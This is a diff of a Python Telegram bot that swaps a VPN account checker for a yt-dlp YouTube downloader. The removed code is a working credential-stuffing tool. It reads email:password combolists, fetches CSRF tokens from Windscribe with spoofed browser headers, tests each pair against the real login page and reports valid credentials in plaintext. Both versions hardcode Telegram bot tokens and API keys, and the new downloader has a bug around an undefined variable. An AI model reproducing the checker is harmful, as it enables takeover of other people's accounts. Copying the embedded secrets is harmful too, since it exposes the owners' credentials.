@@ -1,105 +1,70 @@
 from pyrogram import Client, filters
-import requests
-import os
-import pyromod
+import yt_dlp
 from pyrogram.types import Message
+import os
 
-# Telegram bot token (replace with your bot token)
-BOT_TOKEN = "6909039567:AAFxWc8oVejhey2Y9hophG5__L72tjEQqw0"
+BOT_TOKEN = "6417384180:AAET1sC3LMkRUSwaYjXrWe1vu6u6EY4Ls5Y"
 api_id = 6590520
 api_hash = "7f31db7e8cd1c0959c187e2651935c00"
-# Initialize Pyrogram client
 app = Client("hma_bot", api_id=api_id, api_hash=api_hash, bot_token=BOT_TOKEN)
 
-def hma_login(email, password):
+@app.on_message(filters.command(["video"]))
+async def request_url(client, m: Message):
+    editable = await m.reply_text("**Send the YouTube Video Link**")
+    input_message: Message = await app.listen(editable.chat.id)
+    
+    if not input_message.text:
+        await editable.edit("**Please send a valid YouTube URL**")
+        return
+    
+    url = input_message.text
+    await editable.edit("**Send the desired video quality (e.g., 720p, 1080p)**")
+    quality_message: Message = await app.listen(editable.chat.id)
+    
+    if not quality_message.text:
+        await editable.edit("**Please specify a valid quality option**")
+        return
+    
+    quality = quality_message.text.strip().lower()
+    path = "./downloads/"
+    os.makedirs(path, exist_ok=True)
+    
+    # Map quality options to yt-dlp formats
+    quality_map = {
+        '360p': 'worstvideo',
+        '480p': 'bestaudio/best',
+        '720p': 'bestvideo[height<=720]+bestaudio/best',
+        '1080p': 'bestvideo[height<=1080]+bestaudio/best',
+        'best': 'bestvideo+bestaudio/best'
+    }
+    
+    # Default to best if quality not in map
+    format_option = quality_map.get(quality, 'bestvideo+bestaudio/best')
+    
+    # Set up yt-dlp options
+    ydl_opts = {
+        'outtmpl': os.path.join(path, '%(title)s.%(ext)s'),
+        'format': format_option,
+        'noplaylist': True
+    }
+    
+    # Download the video
+    await editable.edit("**Starting Downloading Video...**")
     try:
-        # Retrieve CSRF token and time
-        url = "https://res.windscribe.com/res/logintoken"
-        headers = {
-            "origin": "https://windscribe.com",
-            "referer": "https://windscribe.com/",
-            "sec-ch-ua": 'Not)A;Brand";v="99", "Brave";v="127", "Chromium";v="127"',
-            "sec-ch-ua-mobile": "?0",
-            "sec-ch-ua-platform": "Windows",
-            "sec-fetch-dest": "empty",
-            "sec-fetch-mode": "cors",
-            "sec-fetch-site": "same-site",
-            "sec-gpc": "1",
-            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"
-        }
-        res_post = requests.post(url, headers=headers)
-        csrf_token = res_post.json().get('csrf_token', '')
-        csrf_time = res_post.json().get('csrf_time', '')
+        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
+            info_dict = ydl.extract_info(url, download=True)
+            video_file = os.path.join(path, f"{info_dict['title']}.mp4")
         
-        # Attempt to log in
-        data = {
-            "login": 1,
-            "upgrade": 0,
-            "csrf_time": csrf_time,
-            "csrf_token": csrf_token,
-            "username": email,
-            "password": password,
-            "code": ""
-        }
-        res_login = requests.post("https://windscribe.com/login", data=data, headers=headers)
+        # Send the downloaded video to the user
+        await editable.edit("**Uploading Video...**")
+        await client.send_video(chat_id=m.chat.id, video=video_file, caption="Here is your video!")
         
-        if "Account Overview" in res_login.text or "Account Status" in res_login.text:
-            return True, "Login successful."
-        else:
-            return False, "Invalid credentials."
     except Exception as e:
-        return False, f"Login Failed: {str(e)}"
+        await editable.edit(f"**Error: {str(e)}**")
+    
+    finally:
+        # Clean up downloaded files
+        if os.path.exists(video_file):
+            os.remove(video_file)
 
-# Command handler to check HMA VPN accounts using a combolist file
-@app.on_message(filters.command(["hma"]))
-async def trans(client, m: Message):
-    try:
-        editable = await m.reply_text("**Send Text file **")
-        input_msg: Message = await app.listen(editable.chat.id)
-        x = await input_msg.download()
-        path = f"./downloads/"
-        editable = await m.reply_text("Starting Account Checking.........")
-
-        # Read the file and initialize progress
-        with open(x, 'r') as file:
-            lines = file.readlines()
-        total_accounts = len(lines)
-
-        # Calculate interval for 1% progress
-        progress_interval = max(1, total_accounts // 100)
-        progress = 0
-        next_progress_threshold = progress_interval
-
-        for index, line in enumerate(lines):
-            line = line.strip()
-            if ':' in line:
-                email, password = line.split(':', 1)
-                success, message = hma_login(email, password)
-                if success:
-                    result_message = f"Good Login for {email} : {password}"
-                else:
-                    result_message = f"Bad Login for {email}: {password} - {message}"
-            else:
-                result_message = f"Invalid line format: {line}"
-            
-            await app.send_message(m.chat.id, result_message)
-
-            # Update progress and send message if necessary
-            if index + 1 >= next_progress_threshold:
-                percent_complete = (index + 1) / total_accounts * 100
-                await app.send_message(
-                    m.chat.id,
-                    f"Progress: {percent_complete:.1f}% ({index + 1}/{total_accounts} accounts checked)"
-                )
-                next_progress_threshold += progress_interval
-
-        await app.send_message(m.chat.id, "DONE CHECKING")
-
-        # Clean up downloaded file
-        os.remove(x)
-    except Exception as e:
-        await app.send_message(m.chat.id, f"An error occurred: {str(e)}")
-
-# Start the bot
-if __name__ == "__main__":
-    app.run()
+app.run()
